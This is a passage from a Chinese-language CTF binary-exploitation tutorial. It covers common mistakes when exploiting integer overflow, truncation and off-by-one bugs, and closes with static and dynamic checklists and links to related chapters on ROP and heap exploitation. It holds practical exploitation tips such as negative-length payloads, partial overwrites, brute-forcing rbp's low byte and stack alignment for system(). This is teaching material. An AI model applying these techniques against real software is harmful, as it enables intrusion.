   - pwntools 的 `p32(-1)`/`p64(-1)` 接受负数并自动回绕（= `b'\xff…'`），但**别把 4 字节包进 8 字节参数**：64 位 `read` 的长度是 8 字节，发 `p32(0xffffffff)` 得到的是 `0x00000000ffffffff`（依然巨大，通常也能用，但语义不同）；`scanf("%d")` 路径则直接发字符串 `b'-1'`；
   - 混淆"发送十进制字符串"与"发送二进制"：`scanf` 吃字符串，`recv` 定长字段吃打包字节，别发反。
3. **越界写坏数据导致先崩溃**：溢出路径上"路过"的 canary、堆 chunk 头、指针表被顺路写花 → 还没执行到目标就 SIGSEGV/`abort`。对策：partial overwrite（只改必要字节）、保持路过的元数据原值（如例题 4 中逐字段恢复 size）、gdb 单步看崩点是否就是计划中的点。
4. **stdio 缓冲吞 payload**：`scanf` 与裸 `read` 共用 stdin 时，先发的数据可能被 FILE 缓冲一次性读走 → 分步交互（`sendafter`），不要一口气全发。
5. **32 位与 64 位回绕位宽不同**：乘法溢出在 `2^32` 还是 `2^64` 上发生，取决于**变量类型**而非机器位数（64 位程序用 `unsigned int` 计数照样在 2^32 回绕）。
6. **INT_MIN 的取负是 UB**：`-INT_MIN == INT_MIN`；遇到 `abs()`/取负的边界值（`0x80000000`）多留个心眼。
7. **read 的部分返回**：`read` 收到一部分就返回——大 payload 务必一次性 `send`，并确认没有在中间等提示符。

---

## 9.12 本章检查清单

拿到题目先过一遍（静态）：

- [ ] 所有长度/大小/下标变量的**类型**是什么？（int / unsigned / short / char / size_t）
- [ ] 每一处长度**检查**与长度**使用**，是不是同一个值、同一个类型、同一次运算？
- [ ] size 计算里有没有 `*` / `+`？乘数最大值多少？结果会不会回绕？检查的是回绕前还是回绕后？
- [ ] 有没有 `(short)`、`(char)`、`& 0xff`、`movsx` 之类的截断/扩展？发生在检查前还是使用前？
- [ ] 数组下标有没有检查**下界**？负下标会摸到谁（GOT / saved rbp / 相邻结构体 / 函数指针表）？
- [ ] `read/recv/fgets/strncpy/memcpy` 的长度是否比缓冲区大 1？循环是 `<` 还是 `<=`？
- [ ] 有没有走不到的初始化路径？未初始化的栈缓冲 / 结构体字段会被打印或当指针用吗？
- [ ] `sizeof` / `strlen` 出现在减法左边吗？（size_t 无符号下溢）
- [ ] `char` 参与比较，目标平台是 signed（x86）还是 unsigned（ARM）？

打 exp 时（动态）：

- [ ] 负长度：`scanf` 路径发 `b'-1'`，定长字段路径发 `p64(-1)`，别把 4 字节塞进 8 字节参数
- [ ] off-by-one 改 rbp 低字节：gdb 确认低 12 位，远程按 16 选 1 爆破或先泄露栈地址
- [ ] 溢出"路过"的元数据（canary / 堆头 / key）保持原值
- [ ] system 打不通先查 16 字节栈对齐（补一个裸 `ret`）
- [ ] scanf 与 read 混用时分步交互，防 stdio 缓冲吞 payload

---

## 相关阅读

- [02-ret2text.md](02-ret2text.md) —— 例题 1 中"返回地址 → backdoor"的基础打法
- [07-ROP高级技巧.md](07-ROP高级技巧.md) —— 更多栈迁移/pivot 姿势，off-by-one 改 ebp 迁移只是其中一种特例
- [10-堆漏洞全解.md](10-堆漏洞全解.md) —— off-by-null 的完整堆利用（unlink / null-byte poisoning / chunk overlap）与例题 4 的进阶变体
